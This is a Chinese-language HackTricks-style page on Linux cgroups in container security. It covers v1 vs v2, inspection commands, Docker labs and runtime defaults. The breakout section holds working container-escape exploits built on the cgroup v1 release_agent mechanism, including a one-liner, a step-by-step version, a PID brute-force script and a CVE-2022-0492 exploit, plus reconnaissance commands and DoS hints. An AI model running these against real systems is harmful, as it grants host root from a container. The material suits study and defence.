# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux **control groups** 是内核机制，用于将进程分组以进行资源计量、限制、优先级分配和策略执行。如果 namespaces 主要用于隔离资源的视图，cgroups 则主要用于治理一组进程可以消耗这些资源的**多少**，并且在某些情况下，控制它们可以与**哪些类别的资源**交互。容器始终依赖 cgroups，即使用户从未直接查看它们，因为几乎每个现代 runtime 都需要一种方式告诉内核“这些进程属于这个工作负载，并且这些是适用于它们的资源规则”。

这就是为什么 container engines 会把一个新容器放到它自己的 cgroup 子树中。一旦进程树在那里，runtime 就可以限制内存、限制 PID 数量、调整 CPU 权重、调节 I/O，并限制设备访问。在生产环境中，这对多租户安全和基本的运维卫生至关重要。没有合理资源控制的容器可能会耗尽内存、用大量进程淹没系统，或以使主机或相邻工作负载不稳定的方式独占 CPU 和 I/O。

从安全角度看，cgroups 重要性体现在两个方面。首先，错误或缺失的资源限制会使简单的拒绝服务攻击变得可行。其次，某些 cgroup 特性，尤其是在较旧的 **cgroup v1** 环境中，当它们在容器内可写时，历史上曾产生过强大的逃逸原语。

## v1 Vs v2

现实中存在两种主要的 cgroup 模型。**cgroup v1** 暴露多个 controller 层次结构，较早的漏洞写作常围绕那里的奇怪且有时过于强大的语义展开。**cgroup v2** 引入了更统一的层次结构和通常更干净的行为。现代发行版越来越偏好 cgroup v2，但混合或遗留环境仍然存在，这意味着在审查真实系统时两种模型仍然相关。

这种差异很重要，因为一些最著名的容器逃逸案例（例如对 cgroup v1 中 **`release_agent`** 的滥用）与较旧的 cgroup 行为紧密相关。看到博客上的 cgroup 利用并盲目将其应用到仅有 cgroup v2 的现代系统的读者，很可能会误解目标系统上实际上可行的内容。

## 检查

查看当前 shell 所在位置的最快方法是：
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` 文件显示与当前进程关联的 cgroup 路径。在现代的 cgroup v2 主机上，通常会看到一个统一条目。在较旧或混合的主机上，可能会看到多个 v1 控制器路径。一旦知道路径，就可以在 `/sys/fs/cgroup` 下检查相应的文件以查看限制和当前使用情况。

在 cgroup v2 主机上，以下命令很有用：
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
这些文件会显示哪些 controllers 存在，以及哪些被委派到子 cgroups。这个委派模型在 rootless 和 systemd-managed 的环境中很重要，因为 runtime 可能只能控制父层级实际委派的那部分 cgroup 功能。

## Lab

观察 cgroups 在实践中的一种方法是运行一个内存受限的 container：
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
你也可以尝试一个受 PID 限制的容器：
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
这些示例很有用，因为它们有助于将运行时标志与内核文件接口连接起来。运行时并不是魔法般地强制规则；它在写入相关的 cgroup 设置，然后让内核针对进程树来强制执行这些设置。

## Runtime Usage

Docker、Podman、containerd 和 CRI-O 在正常操作中都依赖 cgroups。差异通常不是出在它们是否使用 cgroups，而是出在 **它们选择哪些默认值**、**它们如何与 systemd 交互**、**rootless 委派如何工作**，以及 **多少配置是在引擎级别控制而不是在编排级别控制**。

在 Kubernetes 中，资源请求和限制最终会在节点上变成 cgroup 配置。从 Pod YAML 到内核强制执行的路径会经过 kubelet、CRI runtime 和 OCI runtime，但 cgroups 仍然是最终应用规则的内核机制。在 Incus/LXC 环境中，cgroups 也被广泛使用，特别是因为系统容器通常会暴露更丰富的进程树和更类似 VM 的运行期预期。

## Misconfigurations And Breakouts

典型的 cgroup 安全故事是可写的 **cgroup v1 `release_agent`** 机制。在该模型中，如果攻击者能够写入正确的 cgroup 文件、启用 `notify_on_release`，并控制存储在 `release_agent` 中的路径，当该 cgroup 变为空时，内核可能最终在主机的初始命名空间中执行攻击者选择的路径。这就是为什么早期的文章会非常关注 cgroup 控制器的可写性、挂载选项以及命名空间/能力的条件。

即使 `release_agent` 不可用，cgroup 的错误仍然很重要。过于宽泛的设备访问可能导致主机设备从容器中可达。缺失的内存和 PID 限制可能会将简单的代码执行变成对主机的 DoS。rootless 场景中薄弱的 cgroup 委派也可能误导防守方，让他们误以为存在限制，而运行时实际上从未能够应用该限制。

### `release_agent` Background

`release_agent` 技术仅适用于 **cgroup v1**。基本思路是，当一个 cgroup 中的最后一个进程退出且设置了 `notify_on_release=1` 时，内核会执行存储在 `release_agent` 中路径所指向的程序。该执行发生在 **主机的初始命名空间** 中，这就是可写的 `release_agent` 能够变成容器逃逸原语的原因。

要使该技术生效，攻击者通常需要：

- 一个可写的 **cgroup v1** 层级
- 能够创建或使用子 cgroup
- 能够设置 `notify_on_release`
- 能够向 `release_agent` 写入一个路径
- 一个从主机角度可解析为可执行文件的路径

### Classic PoC

历史上的一行 PoC 是：
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
这个 PoC 将 payload 路径写入 `release_agent`，触发 cgroup 释放，然后读取宿主机上生成的输出文件。

### 可读的逐步讲解

将相同的思路分步骤解释会更容易理解。

1. 创建并准备一个可写的 cgroup：
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. 识别对应容器文件系统的主机路径：
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. 投放一个从宿主路径可见的 payload：
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. 通过使 cgroup 为空来触发执行：
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
其效果是在主机端以主机 root 权限执行 payload。在真实利用中，payload 通常会写入一个证明文件、启动一个反向 shell，或修改主机状态。

### 使用 `/proc/<pid>/root` 的相对路径变体

在某些环境中，指向容器文件系统的主机路径并不明显，或被存储驱动隐藏。在这种情况下，payload 路径可以通过 `/proc/<pid>/root/...` 来表示，其中 `<pid>` 是当前容器中某个进程对应的主机 PID。这就是相对路径暴力搜索变体的基础：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
这里相关的技巧不是蛮力本身，而是路径的形式：`/proc/<pid>/root/...` 允许内核从宿主命名空间解析容器文件系统内的文件，即使直接的宿主存储路径事先未知。

### CVE-2022-0492 变体

在 2022 年，CVE-2022-0492 表明在 cgroup v1 中向 `release_agent` 写入时，未正确检查 **初始** 用户命名空间中的 `CAP_SYS_ADMIN`。这使得该技术在易受影响的内核上更容易实现，因为能够挂载 cgroup 层次的容器进程可以写入 `release_agent`，而不需要事先在宿主用户命名空间中拥有特权。

最小的 exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
在易受攻击的内核上，host 会以 root 权限执行 `/proc/self/exe`。

要进行实际滥用，先检查环境是否仍然暴露可写的 cgroup-v1 路径或危险的设备访问：
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
如果 `release_agent` 存在且可写，你已经处于 legacy-breakout territory:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
如果 cgroup path 本身不产生 escape，接下来的实际用途通常是 denial of service 或 reconnaissance：
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
这些命令可以快速告诉你工作负载是否有空间进行 fork-bomb、激进地消耗内存，或滥用可写的旧 cgroup 接口。

## 检查

在审查目标时，cgroup 检查的目的是了解正在使用的是哪种 cgroup 模型、容器是否能看到可写的控制器路径，以及像 `release_agent` 这样的旧型突破原语是否仍然相关。
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
这里值得注意的点：

- 如果 `mount | grep cgroup` 显示 **cgroup v1**，则旧的 breakout writeups 会变得更相关。
- 如果 `release_agent` 存在且可访问，则应立即进行更深入的调查。
- 如果可见的 cgroup 层级是可写的，并且容器还具有强大的 capabilities，则该环境值得更仔细的审查。

如果你发现 **cgroup v1**、可写的 controller 挂载点，以及一个同时具有强 capabilities 或 seccomp/AppArmor 保护薄弱的容器，那么这种组合值得仔细关注。cgroups 通常被视为一个枯燥的资源管理话题，但从历史上看，它们确实出现在一些最具教育意义的 container escape chains 中，正因为“资源控制”和“主机影响”之间的边界并不像人们想象的那样清晰。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认启用 | 容器会被自动放入 cgroups；资源限制是可选的，除非使用相应的 flags 设置 | 省略 `--memory`、`--pids-limit`、`--cpus`、`--blkio-weight`；`--device`；`--privileged` |
| Podman | 默认启用 | `--cgroups=enabled` 是默认；cgroup namespace 的默认值因 cgroup 版本而异（在 cgroup v2 上为 `private`，在一些 cgroup v1 设置上为 `host`） | `--cgroups=disabled`、`--cgroupns=host`、放宽设备访问、`--privileged` |
| Kubernetes | 通过运行时默认启用 | Pod 和容器由节点 runtime 放入 cgroups；细粒度资源控制取决于 `resources.requests` / `resources.limits` | 省略资源 requests/limits、特权设备访问、主机级 runtime 配置错误 |
| containerd / CRI-O | 默认启用 | cgroups 是正常生命周期管理的一部分 | 直接的 runtime 配置，用于放宽设备控制或暴露遗留的可写 cgroup v1 接口 |

重要的区别在于，**cgroup 的存在**通常是默认的，而**有意义的资源限制**通常是可选的，除非被显式配置。
